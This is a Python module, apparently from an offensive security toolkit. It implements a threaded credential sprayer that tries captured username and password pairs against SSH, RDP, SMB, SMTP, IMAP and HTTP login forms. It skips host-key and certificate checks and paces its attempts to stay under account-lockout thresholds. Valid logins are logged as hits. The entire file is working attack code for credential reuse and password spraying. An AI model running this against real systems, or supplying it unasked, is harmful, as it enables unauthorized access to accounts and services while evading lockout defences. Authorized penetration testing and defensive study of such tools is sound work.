"""
Credential Spray / Reuse Testing
---------------------------------
Spray captured credentials across multiple services to identify reuse:
  - SSH (via subprocess ssh with sshpass)
  - RDP (via xfreerdp subprocess)
  - SMB (via smbclient subprocess)
  - SMTP (socket-based port 25/587)
  - IMAP (socket-based port 143/993)
  - HTTP forms (raw socket _http_request pattern)

Configurable delay between attempts (lockout-aware).
Threaded with max_concurrent workers.
"""

import time
import socket
import ssl
import subprocess
import threading
from collections import defaultdict
from queue import Queue, Empty

from .config import log


class CredentialSprayer:
    """
    Spray credentials across multiple service types to detect credential reuse.

    Supports SSH, RDP, SMB, SMTP, IMAP, and HTTP form-based authentication.
    Lockout-aware with configurable delays between attempts per host.
    """

    def __init__(self, max_concurrent=5, delay_between_attempts=2.0,
                 lockout_threshold=3, lockout_delay=300):
        self._credentials = []  # list of (username, password)
        self._targets = []  # list of (host, port, protocol)
        self._results = []
        self._running = False
        self._threads = []
        self._queue = Queue()
        self._lock = threading.Lock()

        self.max_concurrent = max_concurrent
        self.delay_between_attempts = delay_between_attempts
        self.lockout_threshold = lockout_threshold
        self.lockout_delay = lockout_delay

        # Track attempts per host to avoid lockouts
        self._attempt_counts = defaultdict(int)
        self._last_attempt_time = defaultdict(float)

    def add_credential(self, username, password):
        """Add a credential pair to the spray list."""
        self._credentials.append((username, password))

    def add_target_service(self, host, port, protocol):
        """
        Add a target service to spray against.

        Args:
            host: Target hostname or IP
            port: Target port number
            protocol: One of 'ssh', 'rdp', 'smb', 'smtp', 'imap', 'http'
        """
        protocol = protocol.lower()
        if protocol not in ('ssh', 'rdp', 'smb', 'smtp', 'imap', 'http'):
            log.warning(f"Unsupported protocol: {protocol}")
            return
        self._targets.append((host, port, protocol))

    def start(self):
        """Start credential spraying in background threads."""
        if self._running:
            return
        self._running = True
        self._results = []

        # Build work queue: each item is (username, password, host, port, protocol)
        for username, password in self._credentials:
            for host, port, protocol in self._targets:
                self._queue.put((username, password, host, port, protocol))

        # Launch worker threads
        num_workers = min(self.max_concurrent, self._queue.qsize())
        for i in range(num_workers):
            t = threading.Thread(target=self._worker, daemon=True, name=f"sprayer-{i}")
            t.start()
            self._threads.append(t)

        log.info(f"Credential sprayer started: {len(self._credentials)} creds x "
                 f"{len(self._targets)} targets = {self._queue.qsize()} attempts")

    def _worker(self):
        """Worker thread that processes spray attempts from the queue."""
        while self._running:
            try:
                item = self._queue.get(timeout=1.0)
            except Empty:
                break

            username, password, host, port, protocol = item

            # Check lockout threshold
            key = f"{host}:{port}"
            with self._lock:
                if self._attempt_counts[key] >= self.lockout_threshold:
                    elapsed = time.time() - self._last_attempt_time[key]
                    if elapsed < self.lockout_delay:
                        log.warning(f"Lockout threshold reached for {key}, waiting...")
                        time.sleep(min(self.lockout_delay - elapsed, 60))
                    self._attempt_counts[key] = 0

            # Delay between attempts
            with self._lock:
                last = self._last_attempt_time[key]
                elapsed = time.time() - last
                if elapsed < self.delay_between_attempts:
                    time.sleep(self.delay_between_attempts - elapsed)
                self._last_attempt_time[key] = time.time()
                self._attempt_counts[key] += 1

            # Execute the spray attempt
            success = False
            error = None
            try:
                if protocol == 'ssh':
                    success = self._test_ssh(host, port, username, password)
                elif protocol == 'rdp':
                    success = self._test_rdp(host, port, username, password)
                elif protocol == 'smb':
                    success = self._test_smb(host, port, username, password)
                elif protocol == 'smtp':
                    success = self._test_smtp(host, port, username, password)
                elif protocol == 'imap':
                    success = self._test_imap(host, port, username, password)
                elif protocol == 'http':
                    success = self._test_http(host, port, username, password)
            except Exception as e:
                error = str(e)
                log.debug(f"Spray error {protocol}://{host}:{port} - {e}")

            result = {
                "username": username,
                "password": password,
                "host": host,
                "port": port,
                "protocol": protocol,
                "success": success,
                "error": error,
                "timestamp": time.time()
            }

            with self._lock:
                self._results.append(result)

            if success:
                log.critical(f"CREDENTIAL VALID: {username}:{password} @ "
                             f"{protocol}://{host}:{port}")

            self._queue.task_done()

    def _test_ssh(self, host, port, username, password):
        """Test SSH credentials using sshpass + ssh subprocess."""
        try:
            result = subprocess.run(
                ["sshpass", "-p", password, "ssh",
                 "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=10",
                 "-o", "BatchMode=no",
                 "-p", str(port),
                 f"{username}@{host}", "echo", "SUCCESS"],
                capture_output=True, text=True, timeout=15
            )
            return "SUCCESS" in result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return False

    def _test_rdp(self, host, port, username, password):
        """Test RDP credentials using xfreerdp subprocess."""
        try:
            result = subprocess.run(
                ["xfreerdp", f"/v:{host}:{port}",
                 f"/u:{username}", f"/p:{password}",
                 "/cert-ignore", "+auth-only", "/sec:nla"],
                capture_output=True, text=True, timeout=15
            )
            # xfreerdp returns 0 on successful auth-only check
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return False

    def _test_smb(self, host, port, username, password):
        """Test SMB credentials using smbclient subprocess."""
        try:
            result = subprocess.run(
                ["smbclient", f"//{host}/IPC$",
                 "-U", f"{username}%{password}",
                 "-p", str(port), "-c", "exit"],
                capture_output=True, text=True, timeout=15
            )
            # smbclient returns 0 on success
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return False

    def _test_smtp(self, host, port, username, password):
        """Test SMTP credentials using socket-based AUTH LOGIN."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if port == 465:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            banner = sock.recv(1024).decode(errors='ignore')

            if port == 587:
                sock.sendall(b"EHLO test\r\n")
                sock.recv(4096)
                sock.sendall(b"STARTTLS\r\n")
                resp = sock.recv(1024).decode(errors='ignore')
                if "220" in resp:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)

            sock.sendall(b"EHLO test\r\n")
            sock.recv(4096)

            # AUTH LOGIN
            import base64
            sock.sendall(b"AUTH LOGIN\r\n")
            resp = sock.recv(1024).decode(errors='ignore')
            if "334" not in resp:
                return False

            sock.sendall(base64.b64encode(username.encode()) + b"\r\n")
            resp = sock.recv(1024).decode(errors='ignore')
            if "334" not in resp:
                return False

            sock.sendall(base64.b64encode(password.encode()) + b"\r\n")
            resp = sock.recv(1024).decode(errors='ignore')

            sock.sendall(b"QUIT\r\n")
            return "235" in resp  # 235 = Authentication successful

        except (socket.error, socket.timeout, OSError):
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def _test_imap(self, host, port, username, password):
        """Test IMAP credentials using socket-based LOGIN."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if port == 993:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            banner = sock.recv(1024).decode(errors='ignore')

            if "OK" not in banner and "* " not in banner:
                return False

            # Send LOGIN command
            login_cmd = f'a001 LOGIN "{username}" "{password}"\r\n'
            sock.sendall(login_cmd.encode())
            resp = sock.recv(4096).decode(errors='ignore')

            sock.sendall(b"a002 LOGOUT\r\n")
            return "a001 OK" in resp

        except (socket.error, socket.timeout, OSError):
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def _test_http(self, host, port, username, password):
        """Test HTTP form-based login using raw sockets."""
        login_paths = ["/login", "/admin", "/", "/auth", "/signin"]
        form_bodies = [
            f"username={username}&password={password}",
            f"user={username}&pass={password}",
            f"login={username}&password={password}",
        ]

        for path in login_paths:
            for body in form_bodies:
                status, headers, resp_body = self._http_request(
                    host, port, "POST", path,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=body, timeout=10
                )

                if status is None:
                    continue

                # Success indicators
                if status in (301, 302, 303):
                    location = headers.get("location", "").lower()
                    if "login" not in location and location:
                        return True

                if status == 200:
                    lower_body = resp_body.lower()
                    success_kw = ["welcome", "dashboard", "logout", "success"]
                    fail_kw = ["invalid", "incorrect", "failed", "wrong", "error"]
                    if any(k in lower_body for k in success_kw) and \
                       not any(k in lower_body for k in fail_kw):
                        return True

        return False

    def _http_request(self, host, port, method, path, headers=None,
                      body=None, timeout=10):
        """Send raw HTTP request and return (status_code, headers_dict, body)."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))

            request_line = f"{method} {path} HTTP/1.1\r\n"
            default_headers = {
                "Host": host,
                "User-Agent": "Mozilla/5.0 (compatible; CredSprayer/1.0)",
                "Connection": "close",
            }
            if headers:
                default_headers.update(headers)

            if body:
                if isinstance(body, str):
                    body = body.encode()
                default_headers["Content-Length"] = str(len(body))

            header_str = "".join(f"{k}: {v}\r\n" for k, v in default_headers.items())
            request = (request_line + header_str + "\r\n").encode()
            if body:
                request += body if isinstance(body, bytes) else body.encode()

            sock.sendall(request)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:
                        break
                except socket.timeout:
                    break

            if not response:
                return None, {}, ""

            resp_str = response.decode(errors="ignore")
            header_end = resp_str.find("\r\n\r\n")
            if header_end == -1:
                return None, {}, resp_str

            header_section = resp_str[:header_end]
            resp_body = resp_str[header_end + 4:]

            lines = header_section.split("\r\n")
            status_code = None
            if lines and "HTTP/" in lines[0]:
                parts = lines[0].split(" ", 2)
                if len(parts) >= 2:
                    try:
                        status_code = int(parts[1])
                    except ValueError:
                        pass

            resp_headers = {}
            for line in lines[1:]:
                if ":" in line:
                    key, val = line.split(":", 1)
                    resp_headers[key.strip().lower()] = val.strip()

            return status_code, resp_headers, resp_body

        except (socket.error, socket.timeout, OSError):
            return None, {}, ""
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def stop(self):
        """Stop all spray workers."""
        self._running = False
        for t in self._threads:
            t.join(timeout=5)
        self._threads = []

    def get_results(self):
        """Return all spray results."""
        with self._lock:
            return list(self._results)

    def get_stats(self):
        """Return spray statistics."""
        with self._lock:
            total = len(self._results)
            successes = sum(1 for r in self._results if r.get("success"))
            pending = self._queue.qsize()
            return {
                "total_credentials": len(self._credentials),
                "total_targets": len(self._targets),
                "attempts_completed": total,
                "attempts_pending": pending,
                "successes": successes,
                "running": self._running,
            }
